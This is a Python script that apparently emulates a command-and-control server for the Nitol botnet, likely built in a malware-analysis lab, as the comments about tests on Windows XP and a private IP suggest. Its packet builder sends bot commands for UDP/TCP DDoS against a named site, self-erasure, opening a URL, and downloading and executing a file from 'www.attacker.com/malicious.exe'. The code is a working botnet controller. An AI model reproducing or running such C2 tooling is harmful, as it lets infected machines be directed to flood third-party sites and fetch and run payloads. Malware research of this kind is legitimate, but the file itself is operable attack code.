
import os
import socket
import threading

# IP = socket.gethostbyname(socket.gethostname())
IP = "192.168.223.128"
PORT = 9999             # TODO: change this following actual malware.
ADDR = (IP, PORT)
SIZE = 1024
FORMAT = "utf-8"
SERVER_DATA_PATH = "server_data"
BYTE_ORDER = "little"

# Nitol CONFIG.
ORDER = (0x6).to_bytes(4, byteorder=BYTE_ORDER)      # 2: UDP/TCP DDoS; 6 clear; 0x10 download and execute file; 0x14 open webpage with IE
VICTIM = b"www.baidu.com\x00"       # len=0x11c
ATK_PORT = (200).to_bytes(4, byteorder=BYTE_ORDER)   # DWORD
ATK_TIME = (100).to_bytes(4, byteorder=BYTE_ORDER)       # DWORD (in min.)
THREAD_COUNT = (100).to_bytes(4, byteorder=BYTE_ORDER)           # DWORD
ATK_METHOD = (0x20).to_bytes(4, byteorder=BYTE_ORDER)     # DWORD, 2: random_udp, 3: icmp

WEB_URL = b"www.victim.com"
FILE_URL = b"http://www.attacker.com/malicious.exe"

def make_pkt():
    global VICTIM
    # make Nitol c2 pkt.
    if int.from_bytes(ORDER, BYTE_ORDER) == 2:
        # UDP/TCP DDoS
        # (TODO: test not passed on XP. nitol crashes and resets connection.)
        while len(VICTIM) < 0x11c:
            VICTIM = VICTIM + b"\x00"
        data = VICTIM + ATK_PORT + ATK_TIME + THREAD_COUNT + ATK_METHOD
    elif int.from_bytes(ORDER, BYTE_ORDER) == 6:
        # erases itself & related files 
        # (tested on XP. malware erases itself and resets connedction with C2)
        data = bytes()
    elif int.from_bytes(ORDER, BYTE_ORDER) in [0x10, 0x11, 0x12]:
        # download & execute file 
        # (tested on XP. file is executed backstage, can be found in taskmgr). 
        data = FILE_URL
    elif int.from_bytes(ORDER, BYTE_ORDER) == 0x14:
        # open URL with IE 
        # (tested on XP. IE pops up front).
        data = WEB_URL
    
    buf_len = (len(data)).to_bytes(4, byteorder=BYTE_ORDER)
    payload = buf_len + ORDER + data
    return payload

def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")

    while True:
        data = conn.recv(SIZE)
        conn.send(make_pkt())

    print(f"[DISCONNECTED] {addr} disconnected")
    conn.close()

def main():
    print("[STARTING] Server is starting")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)
    server.listen()
    print(f"[LISTENING] Server is listening on {IP}:{PORT}.")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")

if __name__ == "__main__":
    main()
